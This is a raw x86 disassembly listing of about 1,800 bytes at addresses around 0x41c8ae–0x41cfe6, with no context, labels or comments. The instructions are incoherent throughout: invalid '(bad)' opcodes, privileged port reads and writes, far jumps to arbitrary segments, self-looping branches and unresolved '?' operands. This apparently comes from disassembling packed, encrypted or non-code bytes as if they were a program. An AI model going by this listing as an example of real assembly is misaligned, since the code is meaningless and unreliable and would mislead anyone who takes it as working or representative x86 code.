  41c8ae:	fdivr  DWORD PTR [eax-0x661c9b45]
  41c8b4:	in     eax,0x68
  41c8b6:	cmp    DWORD PTR [ebx+0x30],ebx
  41c8b9:	cmp    eax,DWORD PTR [esp+esi*2-0x649d095e]
  41c8c0:	pop    eax
  41c8c1:	scas   al,BYTE PTR es:[edi]
  41c8c2:	sbb    eax,0xc0c4165b
  41c8c7:	xchg   BYTE PTR [ecx+edi*1-0x5c],bl
  41c8cb:	idiv   BYTE PTR [esi-0x1fad4625]
  41c8d1:	mov    dl,0x5d
  41c8d3:	ss or  ebx,ecx
  41c8d6:	or     eax,0x68593c83
  41c8db:	arpl   cx,sp
  41c8dd:	adc    BYTE PTR [eax],0x9
  41c8e0:	aad    0x16
  41c8e2:	stc    
  41c8e3:	xor    al,BYTE PTR [edx]
  41c8e5:	xchg   ebx,eax
  41c8e6:	sti    
  41c8e7:	jmp    0xe5952b73
  41c8ec:	dec    esi
  41c8ed:	in     al,dx
  41c8ee:	sub    ecx,DWORD PTR [ecx+0x7626f995]
  41c8f4:	out    dx,al
  41c8f5:	cmp    al,0xfd
  41c8f7:	fwait
  41c8f8:	inc    ebx
  41c8f9:	lock in al,dx
  41c8fb:	sub    eax,0x519f6f2f
  41c900:	nop
  41c901:	call   0xf3fdac6
  41c906:	adc    ecx,edx
  41c908:	pop    ecx
  41c909:	lods   al,BYTE PTR ds:[esi]
  41c90a:	mov    cl,0x34
  41c90c:	bound  esi,QWORD PTR [eax]
  41c90e:	out    dx,al
  41c90f:	outs   dx,BYTE PTR ds:[esi]
  41c910:	lds    esp,FWORD PTR [edi]
  41c912:	inc    ebp
  41c913:	push   eax
  41c914:	in     eax,dx
  41c915:	(bad)  
  41c916:	retf   
  41c917:	pusha  
  41c918:	ja     0x41c8ef
  41c91a:	mov    dh,0x7a
  41c91c:	outs   dx,DWORD PTR ds:[esi]
  41c91d:	add    DWORD PTR [ebx+0x6],ebp
  41c920:	jb     0x41c8de
  41c922:	outs   dx,DWORD PTR ds:[esi]
  41c923:	lahf   
  41c924:	push   esp
  41c925:	out    dx,eax
  41c926:	cmp    edi,DWORD PTR [esi+0x6ceaad4f]
  41c92c:	rol    DWORD PTR [ecx-0x76],0xe0
  41c930:	mov    ?,ecx
  41c932:	inc    ebp
  41c933:	push   0x5e
  41c935:	xchg   BYTE PTR [ebp-0x5c6d1573],dh
  41c93b:	shl    BYTE PTR [ebx+0x27608ff4],1
  41c941:	jl     0x41c9ab
  41c943:	xchg   esi,eax
  41c944:	xchg   BYTE PTR [esi-0x5c],bh
  41c947:	mov    dl,0xaa
  41c949:	mov    eax,ds:0x4418dc06
  41c94e:	(bad)  
  41c94f:	adc    ecx,DWORD PTR [esi+eiz*8]
  41c952:	rcl    BYTE PTR [ebp+0x64aab207],1
  41c958:	mov    ecx,0x3052128d
  41c95d:	mov    bl,0x23
  41c95f:	test   BYTE PTR [ebx-0x781f5ac],cl
  41c965:	pop    ds
  41c966:	dec    edi
  41c967:	push   ecx
  41c968:	pop    edx
  41c969:	jle    0x41c969
  41c96b:	mov    ecx,ss
  41c96d:	xchg   esp,eax
  41c96e:	inc    edx
  41c96f:	jnp    0x41c9ce
  41c971:	inc    ebx
  41c972:	pop    si
  41c974:	push   es
  41c975:	test   dh,ch
  41c977:	dec    eax
  41c978:	outs   dx,DWORD PTR ds:[esi]
  41c979:	dec    edx
  41c97a:	xlat   BYTE PTR ds:[ebx]
  41c97b:	jns    0x41c979
  41c97d:	(bad)  
  41c97e:	sti    
  41c97f:	jo     0x41c9fa
  41c981:	mov    ch,0xbf
  41c983:	(bad)
  41c986:	test   BYTE PTR [eax-0x3a25c057],al
  41c98c:	add    DWORD PTR [eax+edi*8],eax
  41c98f:	mov    al,ds:0x1443897a
  41c994:	xchg   esp,eax
  41c995:	int3   
  41c996:	push   ds
  41c997:	xchg   esp,eax
  41c998:	dec    esi
  41c999:	popa   
  41c99a:	(bad)
  41c99d:	jnp    0x41c92e
  41c99f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9a0:	les    eax,FWORD PTR [ebx-0x2ee20414]
  41c9a6:	lods   eax,DWORD PTR ds:[esi]
  41c9a7:	out    dx,al
  41c9a8:	out    0x10,al
  41c9aa:	push   edx
  41c9ab:	gs aaa 
  41c9ad:	shl    ch,cl
  41c9af:	not    DWORD PTR [ebx-0x724938af]
  41c9b5:	test   DWORD PTR [esi+0x1a56f20a],ebx
  41c9bb:	cld    
  41c9bc:	pop    ecx
  41c9bd:	pusha  
  41c9be:	mov    ch,0xa0
  41c9c0:	push   ss
  41c9c1:	popf   
  41c9c2:	rcl    BYTE PTR [ebx],cl
  41c9c4:	xor    al,0xfa
  41c9c6:	sub    cl,BYTE PTR [ebx-0x2]
  41c9c9:	push   eax
  41c9ca:	cmp    DWORD PTR [eax+0x1],edx
  41c9cd:	mov    edx,0x9a06cc82
  41c9d2:	jl     0x41ca27
  41c9d4:	jo     0x41c9ad
  41c9d6:	push   ebp
  41c9d7:	inc    bh
  41c9d9:	sahf   
  41c9da:	jns    0x41c99a
  41c9dc:	adc    DWORD PTR ds:0x28f35d61,ecx
  41c9e2:	mov    eax,ds:0x9d287696
  41c9e7:	pop    edx
  41c9e8:	jo     0x41ca4f
  41c9ea:	shr    BYTE PTR [ebx+0x157b6027],1
  41c9f0:	loope  0x41ca21
  41c9f2:	push   eax
  41c9f3:	cmc    
  41c9f4:	adc    BYTE PTR [ecx+0x4a],ch
  41c9f7:	push   edx
  41c9f8:	fs stos DWORD PTR es:[edi],eax
  41c9fa:	and    esi,ebp
  41c9fc:	jmp    0xcbc56b
  41ca01:	test   eax,0xdc8aa2e0
  41ca06:	mov    eax,ds:0x996b012b
  41ca0b:	loope  0x41c9f7
  41ca0d:	add    al,0x34
  41ca0f:	mov    edi,DWORD PTR [edi-0x65a4bb94]
  41ca15:	ds pushf 
  41ca17:	aas    
  41ca18:	lea    ecx,[ecx+0x789b6b4a]
  41ca1e:	retf   0xa864
  41ca21:	(bad)  
  41ca22:	in     al,dx
  41ca23:	jle    0x41ca71
  41ca25:	enter  0x18f,0x34
  41ca29:	(bad)  
  41ca2a:	out    dx,eax
  41ca2b:	test   al,0x2
  41ca2d:	mov    dh,0xff
  41ca2f:	jno    0x41c9f8
  41ca31:	cmp    eax,0xf059d656
  41ca36:	or     cl,dh
  41ca38:	(bad)  
  41ca39:	(bad)  
  41ca3a:	mov    edi,0x5a12971c
  41ca3f:	pop    ecx
  41ca40:	push   esi
  41ca41:	out    dx,eax
  41ca42:	bound  ebp,QWORD PTR [esi-0x8]
  41ca45:	pop    eax
  41ca46:	sub    al,0xfb
  41ca48:	mov    dl,0x7c
  41ca4a:	nop
  41ca4b:	es aam 0xf9
  41ca4e:	sub    DWORD PTR [eax],0xee182ae4
  41ca54:	cmp    DWORD PTR [ebx+0x1e0ec12d],ebx
  41ca5a:	in     al,dx
  41ca5b:	sbb    BYTE PTR [eax-0x2f],dh
  41ca5e:	mov    ch,0x72
  41ca60:	imul   esp,DWORD PTR ds:0x6e89c8b2,0x57
  41ca67:	inc    ebp
  41ca68:	lea    ecx,[eax+ebx*1+0x16]
  41ca6c:	xchg   ah,ch
  41ca6e:	xor    ebp,0xd4a3db3a
  41ca74:	test   DWORD PTR [ebx*1+0x625afce1],ecx
  41ca7b:	ins    DWORD PTR es:[edi],dx
  41ca7c:	sub    eax,0x402ec0d3
  41ca81:	leave  
  41ca82:	jnp    0x41cad1
  41ca84:	mov    dl,0x92
  41ca86:	xchg   eax,ecx
  41ca88:	jl     0x41ca15
  41ca8a:	pushf  
  41ca8b:	loop   0x41ca81
  41ca8d:	(bad)  
  41ca8e:	sub    ebp,ebx
  41ca90:	dec    esp
  41ca91:	dec    eax
  41ca92:	add    eax,0xf54b3118
  41ca97:	adc    DWORD PTR [edx+0x481386e0],esp
  41ca9d:	xchg   esi,eax
  41ca9e:	repnz fadd QWORD PTR [ecx+0x749148ed]
  41caa5:	mov    WORD PTR [edx+ebp*1+0x2cf41069],es
  41caac:	cwde   
  41caad:	stos   BYTE PTR es:[edi],al
  41caae:	das    
  41caaf:	adc    DWORD PTR [edi-0x24be29a5],esp
  41cab5:	sub    esi,0x75
  41cab8:	mov    bl,0x88
  41caba:	jle    0x41ca4e
  41cabc:	(bad)  
  41cabd:	and    esp,edx
  41cabf:	sub    eax,DWORD PTR [ecx-0x43]
  41cac2:	out    0x41,eax
  41cac4:	stc    
  41cac5:	das    
  41cac6:	pop    edx
  41cac7:	xchg   ecx,eax
  41cac8:	ret    0xfb7e
  41cacb:	and    ecx,DWORD PTR [edi+0x43]
  41cace:	jmp    0xb33:0x377164cb
  41cad5:	and    ebx,ebp
  41cad7:	pop    edi
  41cad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cad9:	push   edx
  41cada:	add    DWORD PTR [ebx+0x72e85d25],edi
  41cae0:	and    ecx,ebp
  41cae2:	ins    DWORD PTR es:[edi],dx
  41cae3:	gs cmp eax,0xaa2bc350
  41cae9:	aas    
  41caea:	push   ecx
  41caeb:	mov    bl,0x36
  41caed:	or     dh,BYTE PTR [edi+0x9f00009]
  41caf3:	in     al,0xad
  41caf5:	stc    
  41caf6:	xor    bh,BYTE PTR [edx]
  41caf8:	sub    al,0xb4
  41cafa:	sti    
  41cafb:	cdq    
  41cafc:	les    esi,FWORD PTR [ebp+0x493f32d8]
  41cb02:	mov    eax,0xfed09e03
  41cb07:	mov    ecx,0xc178c758
  41cb0c:	xor    eax,0xd854968a
  41cb11:	data16 jbe 0x41cb78
  41cb14:	shl    DWORD PTR [esi+0x8],1
  41cb17:	push   es
  41cb18:	push   ecx
  41cb19:	mov    edi,0xd7e890b4
  41cb1e:	pop    edx
  41cb1f:	or     ch,BYTE PTR [ecx-0xb]
  41cb22:	inc    edx
  41cb23:	xor    al,0x27
  41cb25:	and    al,0x27
  41cb27:	(bad)  
  41cb28:	mov    ecx,0x65ad863
  41cb2d:	jmp    0x49ecded1
  41cb32:	sbb    DWORD PTR [esi-0x7d2f1f84],0x57
  41cb39:	push   esp
  41cb3a:	ror    ah,cl
  41cb3c:	mov    eax,ds:0xe0617e68
  41cb41:	inc    esi
  41cb42:	mov    dh,0xd8
  41cb44:	pop    ecx
  41cb45:	sbb    BYTE PTR [eax],0x10
  41cb48:	je     0x41cb56
  41cb4a:	mov    cl,0x2e
  41cb4c:	in     eax,dx
  41cb4d:	push   eax
  41cb4e:	cmp    bh,BYTE PTR [edx+0x75]
  41cb51:	adc    bl,cl
  41cb53:	dec    esi
  41cb54:	inc    ecx
  41cb55:	clc    
  41cb56:	dec    ebx
  41cb57:	sub    DWORD PTR [edi],eax
  41cb59:	hlt    
  41cb5a:	dec    edi
  41cb5b:	test   DWORD PTR [esi+eax*1],esi
  41cb5e:	dec    ecx
  41cb5f:	xchg   DWORD PTR [esi*4-0x62910687],edi
  41cb66:	js     0x41cb8a
  41cb68:	adc    BYTE PTR [edi-0x67719e72],0xc5
  41cb6f:	xor    BYTE PTR [ecx+0x56],ah
  41cb72:	jb     0x41cb67
  41cb74:	jo     0x41cb4d
  41cb76:	jb     0x41cbb2
  41cb78:	sub    ecx,DWORD PTR [edx]
  41cb7a:	cld    
  41cb7b:	pop    ebp
  41cb7c:	out    dx,eax
  41cb7d:	(bad)  
  41cb7e:	rol    BYTE PTR [ebp+0x52033e7c],cl
  41cb84:	shl    DWORD PTR [eax],cl
  41cb86:	pop    ds
  41cb87:	popa   
  41cb88:	mov    edx,0x7c7d33fd
  41cb8d:	add    cl,BYTE PTR [ecx-0x6b]
  41cb90:	rcr    DWORD PTR [eax+0x2a706175],cl
  41cb96:	xchg   edi,eax
  41cb97:	int    0x4b
  41cb99:	xchg   edi,eax
  41cb9a:	repz in eax,dx
  41cb9c:	push   esp
  41cb9d:	lock fnstcw WORD PTR [ebp-0x6a84f38d]
  41cba4:	call   0xecfc3396
  41cba9:	jo     0x41cb50
  41cbab:	(bad)  
  41cbac:	mov    edi,0xc947c97
  41cbb1:	sub    DWORD PTR [edi],edx
  41cbb3:	mov    ebp,0xe89a42ee
  41cbb8:	fisttp DWORD PTR [esi+eax*4]
  41cbbb:	xchg   ecx,eax
  41cbbc:	push   eax
  41cbbd:	and    al,dh
  41cbbf:	repz sahf 
  41cbc1:	pop    eax
  41cbc2:	add    BYTE PTR [ecx+0x15],ah
  41cbc5:	rol    edi,0x3b
  41cbc8:	or     DWORD PTR [edi],edx
  41cbca:	dec    ecx
  41cbcb:	pop    edx
  41cbcc:	(bad)  
  41cbcd:	sti    
  41cbce:	sbb    eax,0x888083a6
  41cbd3:	repz fst DWORD PTR ss:[edi-0x574ddbe3]
  41cbdb:	dec    edi
  41cbdc:	jecxz  0x41cbfa
  41cbde:	pop    edi
  41cbdf:	push   esi
  41cbe0:	mul    BYTE PTR [ebp+0x1c08bf66]
  41cbe6:	icebp  
  41cbe7:	inc    esi
  41cbe8:	mov    al,BYTE PTR [esi+0x533636dd]
  41cbee:	xchg   DWORD PTR [eax],eax
  41cbf0:	xchg   esp,eax
  41cbf1:	inc    edx
  41cbf2:	pushf  
  41cbf3:	mov    dh,0x1b
  41cbf5:	test   DWORD PTR [edx-0x28],eax
  41cbf8:	or     ebp,DWORD PTR [ecx-0x11]
  41cbfb:	xchg   esi,eax
  41cbfc:	mov    dh,0x52
  41cbfe:	add    edi,esi
  41cc00:	sahf   
  41cc01:	pop    ebx
  41cc02:	pop    ecx
  41cc03:	cmp    al,0x78
  41cc05:	inc    dx
  41cc07:	jno    0x41cbb6
  41cc09:	sahf   
  41cc0a:	mov    esp,0xaa9518
  41cc0f:	sub    DWORD PTR [esi+edx*1+0x75e27a00],0x46
  41cc17:	sbb    eax,0x84d8365
  41cc1c:	adc    al,0x83
  41cc1e:	retf   
  41cc1f:	out    0x2e,al
  41cc21:	stos   BYTE PTR es:[edi],al
  41cc22:	cwde   
  41cc23:	fsqrt  
  41cc25:	repnz xchg edx,eax
  41cc27:	aad    0x6c
  41cc29:	(bad)  
  41cc2a:	adc    bh,BYTE PTR ds:0xba1605a1
  41cc30:	sub    BYTE PTR [eax+eax*4+0x43],cl
  41cc34:	repz mov ebx,fs
  41cc37:	jne    0x41cbd3
  41cc39:	push   es
  41cc3a:	push   cs
  41cc3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc3c:	icebp  
  41cc3d:	dec    ebp
  41cc3e:	mov    edx,0x527c6fa9
  41cc43:	push   0xffffffca
  41cc45:	repnz lock or ecx,DWORD PTR [ebp+0x7f]
  41cc4a:	daa    
  41cc4b:	lods   al,BYTE PTR ds:[esi]
  41cc4c:	sub    al,0xf7
  41cc4e:	mov    eax,0xdbb67bbf
  41cc53:	xlat   BYTE PTR ds:[ebx]
  41cc54:	ins    DWORD PTR es:[edi],dx
  41cc55:	je     0x41cbd9
  41cc57:	sbb    bl,ah
  41cc59:	mov    ch,0xf2
  41cc5b:	stos   BYTE PTR es:[edi],al
  41cc5c:	mov    eax,ds:0x9a958fe5
  41cc61:	push   esp
  41cc62:	dec    esp
  41cc63:	out    0x0,al
  41cc65:	push   edx
  41cc66:	cmp    edx,ebx
  41cc68:	arpl   WORD PTR [ebx+ebp*8],bx
  41cc6b:	or     eax,0xc407dad7
  41cc70:	(bad)  
  41cc71:	add    BYTE PTR [esi],ah
  41cc73:	push   ebx
  41cc74:	fadd   DWORD PTR ds:0xadf43e9f
  41cc7a:	jbe    0x41cc01
  41cc7c:	mov    edx,esi
  41cc7e:	imul   ebp,DWORD PTR [edx+0x36],0x69
  41cc82:	ins    BYTE PTR es:[edi],dx
  41cc83:	mov    ss,WORD PTR [ebx-0x54]
  41cc86:	in     al,dx
  41cc87:	sbb    dh,dh
  41cc89:	aam    0xa5
  41cc8b:	inc    ebx
  41cc8c:	out    dx,eax
  41cc8d:	leave  
  41cc8e:	add    DWORD PTR [ebx+0x153a2779],edi
  41cc94:	mov    ebx,0x58552af7
  41cc99:	fist   DWORD PTR [ebp+0x23]
  41cc9c:	jl     0x41cc25
  41cc9e:	and    eax,0x5b8d2685
  41cca3:	inc    ecx
  41cca4:	jp     0x41cd1f
  41cca6:	sbb    al,0xf3
  41cca8:	xchg   DWORD PTR [esi+ebx*2-0x76],ecx
  41ccac:	inc    ebp
  41ccad:	mov    ds:0xe693ad64,al
  41ccb2:	inc    ecx
  41ccb3:	rcl    DWORD PTR [edx+0x49],cl
  41ccb6:	xchg   ebx,eax
  41ccb7:	mov    dh,0xa4
  41ccb9:	ret    0x4ee7
  41ccbc:	dec    ebp
  41ccbd:	call   0xf2e0:0xea142f32
  41ccc4:	repz js 0x41cd0e
  41ccc7:	js     0x41cd00
  41ccc9:	pop    edx
  41ccca:	add    DWORD PTR ds:0x6f81278d,edi
  41ccd0:	sbb    bh,BYTE PTR [ebx-0x55]
  41ccd3:	dec    esi
  41ccd4:	jmp    0xe945:0xe21e95f3
  41ccdb:	not    DWORD PTR [eax+ecx*2+0x39]
  41ccdf:	cwde   
  41cce0:	xchg   ebx,eax
  41cce1:	dec    ecx
  41cce2:	nop
  41cce3:	ror    BYTE PTR [eax+eax*4+0x1],cl
  41cce7:	mov    ch,0xaf
  41cce9:	push   es
  41ccea:	out    dx,eax
  41cceb:	pop    es
  41ccec:	std    
  41cced:	adc    al,0x15
  41ccef:	pop    edx
  41ccf0:	inc    ebx
  41ccf1:	or     ebp,DWORD PTR [ebx]
  41ccf3:	mov    al,0xd8
  41ccf5:	or     eax,0x64df8c86
  41ccfa:	mov    ds:0x76f2f511,al
  41ccff:	xor    al,0x37
  41cd01:	lods   al,BYTE PTR ds:[esi]
  41cd02:	scas   al,BYTE PTR es:[edi]
  41cd03:	jge    0x41cc96
  41cd05:	out    dx,eax
  41cd06:	out    0xbd,eax
  41cd08:	mov    bh,0x46
  41cd0a:	dec    edx
  41cd0b:	fdiv   QWORD PTR [eax]
  41cd0d:	sbb    eax,ebp
  41cd0f:	pop    ss
  41cd10:	adc    ebx,0x3d
  41cd13:	or     cl,bl
  41cd15:	ins    DWORD PTR es:[edi],dx
  41cd16:	xchg   BYTE PTR [eax+esi*4+0x352a10b2],ch
  41cd1d:	xchg   ah,dh
  41cd1f:	je     0x41cd8d
  41cd21:	addr16 fs jg 0x41cccb
  41cd25:	dec    ecx
  41cd26:	pop    edi
  41cd27:	cli    
  41cd28:	add    BYTE PTR [edx],bl
  41cd2a:	cmp    bh,BYTE PTR [edx+0x6f]
  41cd2d:	call   0x69831a8
  41cd32:	adc    al,0xae
  41cd34:	aas    
  41cd35:	in     eax,dx
  41cd36:	inc    ebx
  41cd37:	or     DWORD PTR [esi-0x56],esi
  41cd3a:	and    BYTE PTR [ebp+0x74],bl
  41cd3d:	cmp    esp,DWORD PTR [ebx]
  41cd3f:	loop   0x41cd34
  41cd41:	jl     0x41cdaf
  41cd43:	ss icebp 
  41cd45:	or     eax,0xac1fe757
  41cd4a:	jbe    0x41ccfd
  41cd4c:	push   eax
  41cd4d:	add    BYTE PTR ds:0x2d2e3610,bl
  41cd53:	xchg   esp,eax
  41cd54:	arpl   WORD PTR [edi+0x1b],di
  41cd57:	mov    dh,0xc0
  41cd59:	xor    eax,0xaddffb69
  41cd5e:	mov    esi,0xe3e737fa
  41cd63:	xlat   BYTE PTR ds:[ebx]
  41cd64:	arpl   WORD PTR [ecx-0x42a15905],sp
  41cd6a:	stos   DWORD PTR es:[edi],eax
  41cd6b:	test   DWORD PTR [edx+0x28710621],eax
  41cd71:	adc    DWORD PTR [esi],0x66ad88e4
  41cd77:	dec    ebx
  41cd78:	sub    al,0x2d
  41cd7a:	mov    eax,ds:0x393d1d45
  41cd7f:	or     al,al
  41cd81:	leave  
  41cd82:	mov    ah,0xe9
  41cd84:	sbb    bl,al
  41cd86:	or     DWORD PTR [edx],ecx
  41cd88:	(bad)  
  41cd89:	retf   0xf419
  41cd8c:	jne    0x41cd65
  41cd8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd8f:	call   DWORD PTR [ecx-0x6d]
  41cd92:	push   cs
  41cd93:	mov    dl,0x10
  41cd95:	dec    eax
  41cd96:	add    ebx,DWORD PTR [esp+ecx*2-0x7fa6cc9d]
  41cd9d:	mov    ah,0x34
  41cd9f:	or     BYTE PTR [ebp+0x7b],ch
  41cda2:	lods   eax,DWORD PTR ds:[esi]
  41cda3:	add    al,0xfa
  41cda5:	ins    BYTE PTR es:[edi],dx
  41cda6:	cmp    DWORD PTR [eax],0x30157457
  41cdac:	stos   BYTE PTR es:[edi],al
  41cdad:	sub    eax,0xf8f5e3f6
  41cdb2:	test   DWORD PTR [edi],esp
  41cdb4:	jmp    0x87c905bb
  41cdb9:	push   ecx
  41cdba:	ja     0x41cde3
  41cdbc:	nop
  41cdbd:	enter  0x28ab,0x6
  41cdc1:	pop    edx
  41cdc2:	push   0x7a064829
  41cdc7:	add    DWORD PTR [ecx],ebx
  41cdc9:	dec    eax
  41cdca:	sbb    dh,BYTE PTR [edi]
  41cdcc:	pop    ebp
  41cdcd:	push   bp
  41cdcf:	leave  
  41cdd0:	ds aam 0xef
  41cdd3:	dec    esi
  41cdd4:	sub    al,0xba
  41cdd6:	(bad)  
  41cdd7:	cli    
  41cdd8:	jp     0x41cd7f
  41cdda:	cmc    
  41cddb:	stos   BYTE PTR es:[edi],al
  41cddc:	imul   eax,DWORD PTR [bp+si-0x22],0xffffff9f
  41cde1:	sub    bl,ch
  41cde3:	mov    bh,0xa1
  41cde5:	sbb    BYTE PTR [ebp+0x2f6fcaa7],dl
  41cdeb:	dec    edi
  41cdec:	(bad)  
  41cded:	int3   
  41cdee:	imul   ebp,eax,0x3d60b2ef
  41cdf4:	shr    DWORD PTR [edx-0x59d0abd4],0x47
  41cdfb:	loopne 0x41cdc1
  41cdfd:	test   dh,0x9f
  41ce00:	or     eax,0xc17087a8
  41ce05:	mov    ch,0x58
  41ce07:	ret    
  41ce08:	mov    edi,0x43cf5bb0
  41ce0d:	test   BYTE PTR [ebx],al
  41ce0f:	mov    es,WORD PTR [edx+0x2b]
  41ce12:	xor    al,0x8e
  41ce14:	adc    bh,bh
  41ce16:	cdq    
  41ce17:	pop    esi
  41ce18:	pusha  
  41ce19:	in     eax,0x5e
  41ce1b:	fs or  edx,ebx
  41ce1e:	js     0x41cdec
  41ce20:	je     0x41cdc8
  41ce22:	add    al,dh
  41ce24:	push   es
  41ce25:	sub    eax,0x7d4394be
  41ce2a:	adc    edi,eax
  41ce2c:	xor    eax,0xd0acc977
  41ce31:	sbb    dh,BYTE PTR [ebp-0x7d402ad6]
  41ce37:	(bad)  
  41ce38:	fisub  DWORD PTR [esi]
  41ce3a:	mov    bh,0x1f
  41ce3c:	pop    edi
  41ce3d:	test   BYTE PTR [ebx],ah
  41ce3f:	push   cs
  41ce40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce41:	es aad 0x67
  41ce44:	pop    edx
  41ce45:	popf   
  41ce46:	loope  0x41ce4f
  41ce48:	xchg   DWORD PTR [ecx],eax
  41ce4a:	out    0x9f,al
  41ce4c:	push   ss
  41ce4d:	adc    al,0x91
  41ce4f:	xchg   esi,eax
  41ce50:	in     al,0xd3
  41ce52:	ja     0x41cddb
  41ce54:	js     0x41ce1d
  41ce56:	mov    ?,WORD PTR [ecx]
  41ce58:	xchg   ebx,eax
  41ce59:	into   
  41ce5a:	ins    BYTE PTR es:[edi],dx
  41ce5b:	and    edi,esi
  41ce5d:	cmp    al,0x22
  41ce5f:	push   esi
  41ce60:	push   cs
  41ce61:	jbe    0x41ced2
  41ce63:	fbld   TBYTE PTR [eax]
  41ce65:	ins    BYTE PTR es:[edi],dx
  41ce66:	test   DWORD PTR [esi+0x514b958f],ebp
  41ce6c:	cmp    eax,0x47507b30
  41ce71:	fisttp WORD PTR [esi+0x52fbf790]
  41ce77:	add    al,0x96
  41ce79:	xchg   ebp,eax
  41ce7a:	or     bl,0x90
  41ce7d:	mov    bh,0x0
  41ce7f:	paddsw mm4,QWORD PTR [ecx]
  41ce82:	sub    eax,0xc8615f7c
  41ce87:	and    esp,edx
  41ce89:	sub    esp,edx
  41ce8b:	std    
  41ce8c:	clc    
  41ce8d:	mov    ebx,DWORD PTR [ecx+0x30]
  41ce90:	fs jg  0x41ce30
  41ce93:	or     eax,0xf6d7e1ff
  41ce98:	push   cs
  41ce99:	out    dx,al
  41ce9a:	out    dx,eax
  41ce9b:	pop    esp
  41ce9c:	add    esp,edx
  41ce9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce9f:	mov    cl,0x26
  41cea1:	jmp    0xc699fce3
  41cea6:	mov    WORD PTR [ebp+0x3c],ds
  41cea9:	mov    bl,0x6d
  41ceab:	lock pop ecx
  41cead:	fnstcw WORD PTR ds:0x4b112741
  41ceb3:	cmp    cl,BYTE PTR [ecx+0x4]
  41ceb6:	mov    ecx,0xc46a7a5f
  41cebb:	jecxz  0x41cebb
  41cebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cebe:	add    DWORD PTR [ebx+ebx*1+0x4a14bece],ebx
  41cec5:	movd   mm5,DWORD PTR [edx]
  41cec8:	mov    esp,DWORD PTR [eax]
  41ceca:	mov    bl,0xc1
  41cecc:	test   BYTE PTR [ebp+0x7],ah
  41cecf:	ss pusha 
  41ced1:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ced3:	cdq    
  41ced4:	jb     0x41ced3
  41ced6:	jmp    DWORD PTR [ecx]
  41ced8:	ds jns 0x41cf43
  41cedb:	fmul   DWORD PTR [ecx]
  41cedd:	leave  
  41cede:	in     al,dx
  41cedf:	xor    BYTE PTR [ebp+0x784265c0],cl
  41cee5:	adc    DWORD PTR ds:0x7f98a722,ecx
  41ceeb:	jae    0x41cec9
  41ceed:	sar    BYTE PTR [edi],0xb4
  41cef0:	scas   eax,DWORD PTR es:[edi]
  41cef1:	retf   0x8ec2
  41cef4:	mov    ebp,ecx
  41cef6:	ret    
  41cef7:	xor    eax,0xb38a0a00
  41cefc:	data16 lahf 
  41cefe:	(bad)  
  41ceff:	pop    eax
  41cf00:	adc    al,0x11
  41cf02:	xor    BYTE PTR [edx],ch
  41cf04:	mov    edx,0x2467f8
  41cf09:	mov    ch,0x1d
  41cf0b:	cmp    bl,al
  41cf0d:	ins    BYTE PTR es:[edi],dx
  41cf0e:	es push ecx
  41cf10:	mov    al,ds:0x9f10a3fd
  41cf15:	add    edi,DWORD PTR [ebx+esi*2+0x577be49e]
  41cf1c:	fsub   QWORD PTR [eax+0x214cc5bf]
  41cf22:	mov    bh,0x93
  41cf24:	xor    DWORD PTR ss:[edx-0x59],eax
  41cf28:	pusha  
  41cf29:	(bad)  
  41cf2a:	div    BYTE PTR [eax+0x3620d837]
  41cf30:	mov    esi,0x3cffcc96
  41cf35:	or     BYTE PTR [edx+0x7c1362c3],0x9f
  41cf3c:	fistp  DWORD PTR ds:0x3ceef88a
  41cf42:	leave  
  41cf43:	sub    dh,BYTE PTR [esi-0x3f]
  41cf46:	repz xchg esp,eax
  41cf48:	jle    0x41cef0
  41cf4a:	mov    ch,0xbc
  41cf4c:	add    ebp,edx
  41cf4e:	push   ecx
  41cf4f:	sbb    al,0x7d
  41cf51:	adc    DWORD PTR [edx],ebx
  41cf53:	hlt    
  41cf54:	cmp    eax,esp
  41cf56:	(bad)  
  41cf57:	fxch   st(5)
  41cf59:	xor    DWORD PTR [esi+0x44a5a7fd],0x5b8a6312
  41cf63:	lock (bad) 
  41cf65:	int3   
  41cf66:	push   ecx
  41cf67:	jb     0x41cf84
  41cf69:	jo     0x41cfa4
  41cf6b:	cmp    edi,edx
  41cf6d:	jg     0x41cf92
  41cf6f:	out    0xc7,al
  41cf71:	pushf  
  41cf72:	les    ebx,FWORD PTR [edx]
  41cf74:	(bad)  [edi+0x2d60d55c]
  41cf7a:	cmp    eax,0x711247e6
  41cf7f:	mov    ecx,0xb0c35436
  41cf84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf86:	cmp    DWORD PTR [bp-0x22],esi
  41cf8a:	fwait
  41cf8b:	mov    bl,0xef
  41cf8d:	shl    BYTE PTR [eax-0x12],1
  41cf90:	dec    ebx
  41cf91:	les    ebp,FWORD PTR [ecx]
  41cf93:	xor    ebx,0x1dbec6b4
  41cf99:	aam    0xe2
  41cf9b:	push   es
  41cf9c:	and    edi,eax
  41cf9e:	clc    
  41cf9f:	ret    
  41cfa0:	cdq    
  41cfa1:	hlt    
  41cfa2:	mov    es,ebp
  41cfa4:	and    eax,DWORD PTR [ecx-0x2d]
  41cfa7:	shr    DWORD PTR [esi],cl
  41cfa9:	pusha  
  41cfaa:	lods   al,BYTE PTR ds:[esi]
  41cfab:	lods   al,BYTE PTR ds:[si]
  41cfad:	mov    cl,0xf0
  41cfaf:	add    DWORD PTR [ecx+0x5d],esp
  41cfb2:	daa    
  41cfb3:	pop    ds
  41cfb4:	adc    edi,edx
  41cfb6:	ja     0x41cf79
  41cfb8:	pop    esp
  41cfb9:	enter  0x38c9,0x64
  41cfbd:	mov    ds:0x51f2ff1c,al
  41cfc2:	pushf  
  41cfc3:	call   0x960d:0x7b49a9fd
  41cfca:	pop    esi
  41cfcb:	jmp    0x584e:0x565302d5
  41cfd2:	xor    al,0xca
  41cfd4:	push   esp
  41cfd5:	in     eax,0x15
  41cfd7:	push   ebx
  41cfd8:	jbe    0x41cfb7
  41cfda:	pop    ds
  41cfdb:	or     BYTE PTR [edx+0x5fc19af9],0x14
  41cfe2:	dec    esi
  41cfe3:	sub    edi,ebp
  41cfe5:	cmc    
  41cfe6:	je     0x41d015
